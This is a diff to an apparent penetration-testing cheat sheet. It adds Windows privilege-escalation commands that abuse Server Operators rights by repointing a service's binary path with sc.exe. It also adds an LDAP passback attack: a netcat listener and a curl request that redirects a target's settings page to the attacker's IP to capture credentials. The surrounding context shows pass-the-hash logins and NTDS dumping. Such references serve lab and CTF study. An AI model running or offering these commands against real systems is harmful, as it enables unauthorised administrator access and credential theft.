@@ -376,6 +376,13 @@ accesschk.exe -accepteula -w \\pipe\* -v
 ```cmd
 copy /Y C:\Users\$Username\payload.bat C:\Path\to\task-script.bat
 net localgroup administrators $Username /add
+
+# Server Operators service binary-path abuse
+sc.exe qc $ServiceName
+sc.exe config $ServiceName binPath= "cmd.exe /c <command>"
+sc.exe config $ServiceName binPath= "C:\Windows\system32\<original>.exe"
+sc.exe qc $ServiceName
+net localgroup administrators $Username /delete
 ```
 
 <!-- TODO --> <!-- Add concise token, DLL hijack, registry, AlwaysInstallElevated, and named-pipe branches. -->
@@ -441,6 +448,12 @@ netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds
 # Pass the hash to a domain account
 netexec smb $BoxIP -u Administrator -H $NTHash -d $Domain
 evil-winrm -i $BoxIP -u Administrator -H $NTHash
+```
+
+```bash
+# LDAP passback from an editable server address field
+nc -lvnp 389
+curl -s -X POST --data "ip=$LocalIP" http://$BoxIP/settings.php
 ```
 
 ## 13. PASSWORD ATTACKS
